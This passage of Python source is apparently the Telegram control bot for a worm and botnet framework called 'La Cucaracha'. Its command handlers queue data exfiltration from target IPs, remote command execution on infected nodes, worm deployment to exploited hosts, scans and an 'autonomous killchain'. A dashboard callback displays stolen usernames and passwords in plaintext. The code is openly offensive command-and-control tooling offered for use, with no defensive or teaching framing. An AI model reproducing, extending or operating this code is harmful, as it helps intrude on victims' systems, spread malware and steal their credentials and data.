        "🚀 **Auto Ultimate STARTED** — full autonomous killchain engaged.\n"
        f"Job ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_autostop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """stop auto ultimate - disables autonomous killchain."""
    set_cfg("autostart", "0")
    set_cfg("autostop", "1")
    try:
        with open("/tmp/lacucaracha_autostart", "w") as f:
            f.write("0")
    except:
        pass
    cmd_id = queue_command("autostop", "")
    await update.message.reply_text(
        "🛑 **Auto Ultimate STOPPED** — autonomous killchain disabled.\n"
        f"Job ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_exfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """📤 Queue exfiltration for target."""
    if not context.args:
        await update.message.reply_text("Usage: `/exfil <IP>`", parse_mode="Markdown")
        return
    ip = context.args[0]
    cmd_id = queue_command("exfil", ip)
    await update.message.reply_text(
        f"📤 **Exfil queued** — `{ip}`\nJob ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """📢 Send message to ALL nodes."""
    if not context.args:
        await update.message.reply_text("Usage: `/broadcast <message>`", parse_mode="Markdown")
        return
    msg = " ".join(context.args)
    cmd_id = queue_command("broadcast", msg)
    await update.message.reply_text(
        f"📢 **Broadcast queued**\nMessage: `{msg[:100]}`\nJob ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_exec(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """💻 Execute command on node."""
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("Usage: `/exec <IP> <command>`\nExample: `/exec 10.0.0.1 whoami`", parse_mode="Markdown")
        return
    ip = context.args[0]
    command = " ".join(context.args[1:])
    cmd_id = queue_command("exec", json.dumps({"ip": ip, "cmd": command}))
    await update.message.reply_text(
        f"💻 **Exec queued** — `{ip}`\nCommand: `{command[:100]}`\nJob ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🛑 Graceful shutdown."""
    cmd_id = queue_command("shutdown", "")
    await update.message.reply_text(
        "🛑 **Shutdown signal sent** — engine will stop after current epoch.\n"
        f"Job ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_killswitch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """💀 Activate killswitch — immediate halt."""
    cmd_id = queue_command("killswitch", "")
    await update.message.reply_text(
        "💀 **KILLSWITCH ACTIVATED** — immediate halt in progress.\n"
        f"Job ID: `{cmd_id}`",
        parse_mode="Markdown"
    )


async def cmd_telegram_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🤖 Bot settings."""
    cfg = load_config()
    chat_ids = cfg.get("chat_ids", [])
    admin_ids = cfg.get("admin_ids", [])
    text = (
        "**🤖 BOT SETTINGS**\n\n"
        f"**Bot Token:** `{cfg.get('bot_token', '?')[:8]}...`\n"
        f"**Chat IDs:** `{chat_ids}`\n"
        f"**Admin IDs:** `{admin_ids}`\n\n"
        "**Status:**\n"
        f"Telegram API: ✅ Working\n"
        f"DB Connected: ✅ `{os.path.exists(DB_V5)}`\n"
        f"Bot Commands: ✅ Active\n\n"
        "Use `/help` for command list."
    )
    await update.message.reply_text(text, parse_mode="Markdown")


# --- Callback Query Handler ---
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    if data == "dash_status":
        text = "📊 Fetching status..."
        await query.edit_message_text(text=text)
        # Re-run cmd_status logic inline
        total = db.q("SELECT COUNT(*) as c FROM targets")
        alive = db.q("SELECT COUNT(*) as c FROM targets WHERE icmp_alive=1")
        pwned = db.q("SELECT COUNT(*) as c FROM targets WHERE web_pwned=1 OR embed_pwned=1 OR enterprise_pwned=1 OR brute_pwned=1")
        worm = db.q("SELECT COUNT(*) as c FROM targets WHERE worm_deployed=1")
        creds = db.q("SELECT COUNT(*) as c FROM credentials")

        def g(r): return r[0]["c"] if r else 0
        await query.edit_message_text(
            f"**📊 FLEET STATUS**\n\n"
            f"🎯 Targets: `{g(total)}` (`{g(alive)}` alive)\n"
            f"🔓 Pwned: `{g(pwned)}`\n"
            f"🐛 Worm Nodes: `{g(worm)}`\n"
            f"🔑 Credentials: `{g(creds)}`",
            parse_mode="Markdown"
        )

    elif data == "dash_targets":
        targets = db.q("SELECT ip, port, fp_os, web_pwned FROM targets ORDER BY id DESC LIMIT 10")
        if not targets:
            await query.edit_message_text("🎯 No targets found.", parse_mode="Markdown")
            return
        lines = [f"**🎯 Targets ({len(targets)}):**"]
        for t in targets:
            ip = t["ip"] or "?"
            os_ = t["fp_os"] or "?"
            pwn = "🔓" if t["web_pwned"] else ""
            lines.append(f"• `{ip}` {os_} {pwn}")
        await query.edit_message_text("\n".join(lines), parse_mode="Markdown")

    elif data == "dash_nodes":
        nodes = db.q("SELECT node_ip, version, last_heartbeat FROM worm_mesh WHERE active=1 LIMIT 10")
        if not nodes:
            await query.edit_message_text("🖥️ No active mesh nodes.", parse_mode="Markdown")
            return
        lines = [f"**🖥️ Mesh Nodes ({len(nodes)}):**"]
        for n in nodes:
            ip = n.get("node_ip", "?")
            ver = n.get("version", "?")
            last = n.get("last_heartbeat", 0)
            age = datetime.fromtimestamp(last).strftime("%H:%M") if isinstance(last, (int, float)) and last > 1000000000 else "?"
            lines.append(f"• `{ip}` v{ver} ❤️{age}")
        await query.edit_message_text("\n".join(lines), parse_mode="Markdown")

    elif data == "dash_creds":
        creds = db.q("SELECT ip, username, password, service FROM credentials ORDER BY id DESC LIMIT 10")
        if not creds:
            await query.edit_message_text("🔑 No credentials stored.", parse_mode="Markdown")
            return
        lines = [f"**🔑 Credentials ({len(creds)}):**"]
        for c in creds:
            lines.append(f"• `{c['ip']}` — `{c['username']}:{c['password']}` ({c['service']})")
        await query.edit_message_text("\n".join(lines), parse_mode="Markdown")

    elif data == "dash_scan":
        queue_command("scan", "random")
        await query.edit_message_text(
            "🔍 **Quick scan queued** — scanning random target pool.",
            parse_mode="Markdown"
        )

    elif data == "dash_deploy":
        queue_command("deploy", "")
        await query.edit_message_text(
            "📦 **Worm deploy queued** — deploying to all exploited targets.",
            parse_mode="Markdown"
        )

    elif data == "dash_aggressive":
        current = get_cfg("aggressive", "0")
        new_val = "0" if current == "1" else "1"
        set_cfg("aggressive", new_val)
        try:
            with open("/tmp/lacucaracha_aggressive", "w") as f:
                f.write(new_val)
        except:
            pass
        state = "ON 🔥" if new_val == "1" else "OFF"
        await query.edit_message_text(f"🔥 **Aggressive Mode:** {state}", parse_mode="Markdown")

    elif data == "dash_predator":
        current = get_cfg("predator", "0")
        new_val = "0" if current == "1" else "1"
        set_cfg("predator", new_val)
        try:
            with open("/tmp/lacucaracha_predator", "w") as f:
                f.write(new_val)
        except:
            pass
        state = "ON 🐉" if new_val == "1" else "OFF"
        await query.edit_message_text(f"🐉 **Predator Mode:** {state}", parse_mode="Markdown")


# --- Error Handler ---
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    log.error(f"Update {update} caused error {context.error}")


# --- Main ---
def main():
    cfg = load_config()
    token = cfg.get("bot_token", "")
    if not token:
        log.error("No bot token found. Create telegram_config.json or set env TELEGRAM_BOT_TOKEN")
        sys.exit(1)

    app = Application.builder().token(token).build()

    # Register command handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("logs", cmd_logs))
    app.add_handler(CommandHandler("dashboard", cmd_dashboard))
    app.add_handler(CommandHandler("targets", cmd_targets))
    app.add_handler(CommandHandler("claim", cmd_claim))
    app.add_handler(CommandHandler("top", cmd_top))
    app.add_handler(CommandHandler("whois", cmd_whois))
    app.add_handler(CommandHandler("ping", cmd_ping))
    app.add_handler(CommandHandler("scan", cmd_scan))
    app.add_handler(CommandHandler("exploit", cmd_exploit))
    app.add_handler(CommandHandler("deploy", cmd_deploy))
    app.add_handler(CommandHandler("mesh", cmd_mesh))
    app.add_handler(CommandHandler("nodes", cmd_nodes))
    app.add_handler(CommandHandler("reset", cmd_reset))
    app.add_handler(CommandHandler("delete", cmd_delete))
    app.add_handler(CommandHandler("aggressive", cmd_aggressive))
    app.add_handler(CommandHandler("predator", cmd_predator))
    app.add_handler(CommandHandler("harvest", cmd_harvest))
    app.add_handler(CommandHandler("autostart", cmd_autostart))
    app.add_handler(CommandHandler("autostop", cmd_autostop))
    app.add_handler(CommandHandler("exfil", cmd_exfil))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("exec", cmd_exec))
    app.add_handler(CommandHandler("shutdown", cmd_shutdown))
    app.add_handler(CommandHandler("killswitch", cmd_killswitch))
    app.add_handler(CommandHandler("telegram", cmd_telegram_settings))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_error_handler(error_handler)

    log.info("🐛 LA CUCARACHA BOT — Starting polling...")
    log.info(f"📡 DB: {DB_V5}")
    log.info(f"📡 Commands registered: 29")
    log.info(f"🤖 Telegram: Running")

    # Start the bot
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
